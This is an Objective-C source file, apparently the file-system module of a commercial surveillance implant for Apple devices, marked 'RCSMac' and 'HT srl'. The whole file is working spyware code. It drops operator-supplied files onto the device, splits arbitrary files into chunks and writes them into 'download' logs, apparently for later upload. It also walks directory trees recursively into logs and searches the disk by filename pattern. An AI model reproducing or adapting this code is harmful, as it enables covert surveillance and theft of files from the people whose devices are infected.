/*
 *  RCSIFileSystemManager.m
 *  RCSMac
 *
 *
 *  Created on 1/27/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "RCSIFileSystemManager.h"
#import "RCSICommon.h"

#import "RCSILogManager.h"

//#import "RCSMLogger.h"
//#import "RCSMDebug.h"

#define FS_MAX_DOWNLOAD_FILE_SIZE (100 * 1024 * 1024)
#define FS_MAX_UPLOAD_CHUNK_SIZE  (25 *  1024 * 1024)


@interface RCSIFileSystemManager (private)

- (NSMutableData *)_generateLogDataForPath: (NSString *)aPath
                               isDirectory: (BOOL)isDirectory
                                   isEmpty: (BOOL)isEmpty;

@end

@implementation RCSIFileSystemManager (private)

- (NSMutableData *)_generateLogDataForPath: (NSString *)aPath
                               isDirectory: (BOOL)isDirectory
                                   isEmpty: (BOOL)isEmpty
{
  NSMutableData *logData        = [[NSMutableData alloc] init];
  NSMutableData *rawHeader      = [[NSMutableData alloc]
                                   initWithLength: sizeof(fileSystemHeader)];
  fileSystemHeader *logHeader   = (fileSystemHeader *)[rawHeader bytes];
  logHeader->flags              = 0;
  short unicodeNullTerminator   = 0x0000;
  
  NSDictionary *fileAttributes  = [[NSFileManager defaultManager]
                                   attributesOfItemAtPath: aPath
                                                    error: nil];
  uint64_t fileSize  = (uint64_t)[[fileAttributes objectForKey: NSFileSize]
                                  unsignedLongLongValue];
  int64_t filetime;
  time_t unixTime;
  time(&unixTime);
  
  filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  
  if (isDirectory)
    {
      logHeader->flags |= FILESYSTEM_IS_DIRECTORY;
    }
  if (isEmpty)
    {
      logHeader->flags |= FILESYSTEM_IS_EMPTY;
    }
  
  logHeader->version      = LOG_FILESYSTEM_VERSION;
  logHeader->pathLength   = [aPath lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                            + sizeof(unicodeNullTerminator);
  logHeader->fileSizeLo   = fileSize & 0xFFFFFFFF;
  logHeader->fileSizeHi   = fileSize >> 32;
  logHeader->timestampLo  = filetime & 0xFFFFFFFF;
  logHeader->timestampHi  = filetime >> 32;
  
  [logData appendData: rawHeader];
  [logData appendData: [aPath dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [logData appendBytes: &unicodeNullTerminator
                length: sizeof(short)];
  
  [rawHeader release];
  return [logData autorelease];
}

@end


@implementation RCSIFileSystemManager

- (BOOL)createFile: (NSString *)aFileName withData: (NSData *)aFileData
{
#ifdef DEBUG_FS_MANAGER
  infoLog(@"filename: %@", aFileName);
#endif
  
  NSString *filePath = [NSString stringWithFormat: @"%@/%@",
                        [[NSBundle mainBundle] bundlePath],
                        aFileName];
  
  if ([aFileData length] > FS_MAX_DOWNLOAD_FILE_SIZE)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"file too big! (>%d)", FS_MAX_DOWNLOAD_FILE_SIZE);
#endif
      
      return NO;
    }
  
  return [aFileData writeToFile: filePath
                     atomically: YES];
}

- (BOOL)logFileAtPath: (NSString *)aFilePath
{
  logDownloadHeader *additionalHeader;
  
  u_int numOfTotalChunks  = 1;
  u_int currentChunk      = 1;
  u_int currentChunkSize  = 0;
  
  NSDictionary *fileAttributes;
  fileAttributes = [[NSFileManager defaultManager]
                    attributesOfItemAtPath: aFilePath
                    error: nil];
  
  u_int fileSize = [[fileAttributes objectForKey: NSFileSize] unsignedIntValue];
  numOfTotalChunks = fileSize / FS_MAX_UPLOAD_CHUNK_SIZE + 1;
  NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aFilePath]; 
  
#ifdef DEBUG_FS_MANAGER
  warnLog(@"numOfTotalChunks: %d", numOfTotalChunks);
#endif
  
  //
  // Do while filesize is > 0
  // in order to split the file in FS_MAX_UPLOAD_CHUNK_SIZE
  //
  do
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      u_int fileNameLength = 0;
      NSString *fileName;
    
      if (numOfTotalChunks > 1)
        {
          fileName = [[NSString alloc] initWithFormat: @"%@ [%d of %d]",
                      aFilePath,
                      currentChunk,
                      numOfTotalChunks];
        }
      else
        {
          fileName = [[NSString alloc] initWithString: aFilePath];
        }
      
#ifdef DEBUG_FS_MANAGER
      warnLog(@"%@ with size (%d)", fileName, fileSize);
#endif
    
      currentChunkSize = fileSize;
      if (currentChunkSize > FS_MAX_UPLOAD_CHUNK_SIZE)
        {
          currentChunkSize = FS_MAX_UPLOAD_CHUNK_SIZE;
        }
    
#ifdef DEBUG_FS_MANAGER
      warnLog(@"currentChunkSize: %d", currentChunkSize);
#endif
      
      fileSize -= currentChunkSize;
      currentChunk++;
      fileNameLength = [fileName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      //
      // Fill in the agent additional header
      //
      NSMutableData *rawAdditionalHeader = [NSMutableData dataWithLength:
                                            sizeof(logDownloadHeader) + fileNameLength];
      additionalHeader = (logDownloadHeader *)[rawAdditionalHeader bytes];
      additionalHeader->version         = LOG_FILE_VERSION;
      additionalHeader->fileNameLength  = [fileName lengthOfBytesUsingEncoding:
                                           NSUTF16LittleEndianStringEncoding];
      
      @try
        {
          [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(logDownloadHeader), fileNameLength)
                                         withBytes: [[fileName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
        }
      @catch (NSException *e)
        {
#ifdef DEBUG_FS_MANAGER
          errorLog(@"Exception on replaceBytesInRange makerange");
#endif
          [fileName release];
          [innerPool release];
        }
      
      RCSILogManager *logManager = [RCSILogManager sharedInstance];
      BOOL success = [logManager createLog: LOG_DOWNLOAD
                               agentHeader: rawAdditionalHeader
                                 withLogID: 0];
      
      if (success == FALSE)
        {
#ifdef DEBUG_FS_MANAGER
          errorLog(@"createLog failed");
#endif
          
          [fileName release];
          [innerPool release];
          return FALSE;
        }
        
      NSData *_fileData = nil;
      
      if ((_fileData = [fileHandle readDataOfLength: currentChunkSize]) == nil)
        {
#ifdef DEBUG_FS_MANAGER
          errorLog(@"Error while reading file");
#endif
          
          [fileName release];
          [innerPool release];
          return FALSE;
        }
      
      NSMutableData *fileData = [[NSMutableData alloc] initWithData: _fileData];
      
      if ([logManager writeDataToLog: fileData
                            forAgent: LOG_DOWNLOAD
                           withLogID: 0] == FALSE)
        {
#ifdef DEBUG_FS_MANAGER
          errorLog(@"Error while writing data to log");
#endif
          
          [fileData release];
          [fileName release];
          [innerPool release];
          return FALSE;
        }
      
      if ([logManager closeActiveLog: LOG_DOWNLOAD
                           withLogID: 0] == FALSE)
        {
#ifdef DEBUG_FS_MANAGER
          errorLog(@"Error while closing activeLog");
#endif
          [fileData release];
          [fileName release];
          [innerPool release];
          return FALSE;
        }
      
      [fileData release];
      [fileName release];
      [innerPool drain];
    }
  while (fileSize > 0);
  
  [fileHandle closeFile];
  
  return YES;
}

- (BOOL)logDirContent: (NSString *)aDirPath withDepth: (uint32_t)aDepth
{
  if (aDepth == 0)
    {
#ifdef DEBUG_FS_MANAGER
      infoLog(@"depth is zero, returning");
#endif
      return TRUE;
    }
  
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSFileManager *_fileManager   = [NSFileManager defaultManager];
  BOOL isDir                    = NO;
  int i                         = 0;
  
  if ([aDirPath length] > 2)
    {
      NSString *lastChar = [aDirPath substringWithRange: NSMakeRange([aDirPath length] - 1, 1)];
      
      if ([lastChar isEqualToString: @"*"])
        {
          aDirPath = [aDirPath substringWithRange: NSMakeRange(0, [aDirPath length] - 1)];
        }
      
      NSString *firstChars = [aDirPath substringWithRange: NSMakeRange(0, 2)];
      
      if ([firstChars isEqualToString: @"//"])
        {
          aDirPath = [aDirPath substringWithRange: NSMakeRange(1, [aDirPath length] - 1)];
        }
    }
  
  RCSILogManager *logManager = [RCSILogManager sharedInstance];
  
	[_fileManager fileExistsAtPath: aDirPath
                     isDirectory: &isDir];
  
  if (isDir == TRUE)
    {
#ifdef DEBUG_FS_MANAGER
      infoLog(@"is dir: %@", aDirPath);
#endif
      
      BOOL success = [logManager createLog: LOG_FILESYSTEM
                               agentHeader: nil
                                 withLogID: 0];
      
      if (success == FALSE)
        {
#ifdef DEBUG_FS_MANAGER
          errorLog(@"createLog failed");
#endif
          
          [outerPool release];
          return FALSE;
        }
      
      NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: aDirPath
                                                              error: nil];
      int filesCount      = [dirContent count];
    
      NSMutableData *firstLogData = [self _generateLogDataForPath: aDirPath
                                                      isDirectory: YES
                                                          isEmpty: (filesCount > 0) ? NO : YES];
      if ([logManager writeDataToLog: firstLogData
                            forAgent: LOG_FILESYSTEM
                           withLogID: 0] == FALSE)
        {
#ifdef DEBUG_FS_MANAGER
          errorLog(@"writeDataToLog firstLogData failed");
#endif
          
          [outerPool release];
          return FALSE;
        }
      
#ifdef DEBUG_FS_MANAGER
      infoLog(@"entries (%d)", filesCount);
#endif
      
      for (i = 0; i < filesCount; i++)
        {
          NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
          
          NSString *fileName          = [dirContent objectAtIndex: i];
          NSMutableString *filePath   = [NSMutableString stringWithFormat: @"%@%@", aDirPath, fileName];
          BOOL isEmpty                = NO;
          BOOL isDir                  = NO;
          
          [_fileManager fileExistsAtPath: filePath
                             isDirectory: &isDir];
          
          // when set to 1 we need to recurse in the current subdir
          int recurse = 0;
          
          if (isDir == TRUE)
            {
#ifdef DEBUG_FS_MANAGER
              infoLog(@"is subdir: %@", filePath);
#endif
              NSArray *subDirContent = [_fileManager contentsOfDirectoryAtPath: filePath
                                                                         error: nil];
              isDir = YES;
              
              if ([subDirContent count] > 0)
                {
#ifdef DEBUG_FS_MANAGER
                  infoLog(@"need to recurse on %@", filePath);
#endif
                  recurse = 1;
                }
              else
                {
#ifdef DEBUG_FS_MANAGER
                  warnLog(@"is empty %@", filePath);
#endif
                  isEmpty = YES;
                }
            }
          
          NSMutableData *logData = [self _generateLogDataForPath: filePath
                                                     isDirectory: isDir
                                                         isEmpty: isEmpty];
          
          if ([logManager writeDataToLog: logData
                                forAgent: LOG_FILESYSTEM
                               withLogID: 0] == FALSE)
            {
#ifdef DEBUG_FS_MANAGER
              errorLog(@"writeDataToLog failed");
#endif
              
              [innerPool release];
              [outerPool release];
              return FALSE;
            }
            
#ifdef DEBUG_FS_MANAGER
          infoLog(@"%@ logged", filePath);
#endif
          
          if (recurse == 1)
            {
#ifdef DEBUG_FS_MANAGER
              infoLog(@"recursing on %@", filePath);
#endif
              
              [filePath appendString: @"/"];
              [self logDirContent: filePath
                        withDepth: aDepth - 1];
            }
          
          [innerPool release];
        }
    }
  else
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"Path not found or not a dir (%@)", aDirPath);
#endif
      
      [outerPool release];
      return FALSE;
    }
  
  if ([logManager closeActiveLog: LOG_FILESYSTEM
                       withLogID: 0] == FALSE)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"closeActiveLog failed");
#endif
      
      [outerPool release];
      return FALSE;
    }
    
  [outerPool release];
  return TRUE;
}

- (NSArray *)searchFilesOnHD: (NSString *)aFileMask
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSFileManager *_fileManager = [NSFileManager defaultManager];
  NSString *filePath          = [aFileMask stringByDeletingLastPathComponent];
  NSString *fileNameToMatch   = [aFileMask lastPathComponent];
  NSMutableArray *filesFound  = [[NSMutableArray alloc] init];
  
	BOOL isDir                  = NO;
  int i                       = 0;
  
	[_fileManager fileExistsAtPath: filePath
                     isDirectory: &isDir];
  
  if (isDir == TRUE)
    {
      NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: filePath
                                                              error: nil];
      
      int filesCount = [dirContent count];
      for (i = 0; i < filesCount; i++)
        {
          NSString *fileName = [dirContent objectAtIndex: i];
          
          if (matchPattern([fileName UTF8String],
                           [fileNameToMatch UTF8String]))
            {
              NSString *foundFilePath = [NSString stringWithFormat: @"%@/%@", filePath, fileName];
              [filesFound addObject: foundFilePath];
            }
        }
    }
  
  if ([filesFound count] > 0)
    {
      [outerPool release];
      return [filesFound autorelease];
    }
  
  [filesFound release];
  [outerPool release];
  return nil;
}

@end